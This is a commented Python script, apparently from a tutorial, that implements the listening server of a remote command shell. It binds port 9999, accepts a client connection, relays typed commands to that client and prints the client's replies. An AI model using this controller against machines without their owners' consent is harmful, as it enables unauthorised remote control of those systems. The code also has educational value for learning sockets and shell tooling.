import socket
import sys


# Create socket (Allows two computers to connnect)

def socket_create():
    try:

        # Define the host well as socket and port for binding
        global host
        global port
        global s

        # Host is empty because this is server file
        host = ''

        # Use any port number other than known ones.
        port = 9999

        # Attach socket function to variable we just defined
        s = socket.socket()

    # Handle try statement if socket doesn't work
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port and wait for connection from client
def socket_bind():
    # Try binding the socket
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))

        # Server listens up to 5 connections before refusing connections
        s.listen(5)

    # Handle the try statement
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")

        # If function fails use recursion and call it again until it binds.
        socket_bind()


# Establish a connection with client ( socket must be listening for them)

def socket_accept():
    conn,address = s.accept()
    # Display client data when connection occurs
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    # Function that references the connection itself
    send_commands(conn)
    conn.close()

# Send commands
def send_commands(conn):

    # While connection occurs
    while True:

        # cmd would equal to our input
        cmd = input()
        #If cmd equals quit
        if cmd == 'quit':
            # Close the connection
            conn.close()
            # Close the socket to close the communication between the computers
            s.close()
            sys.exit()

        # If we have input then bother sending message over the network and convert cmd bytes to string
        if len(str.encode(cmd)) > 0:
            # Send the command
            conn.send(str.encode(cmd))
            # Get client response and convert it to bytes to string so it is readable
            # and set 1024 buffer size for data with utf-8 encoding
            client_response = str(conn.recv(1024), "utf-8")
            # When printing client response do not move cursor to new line
            print(client_response,end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
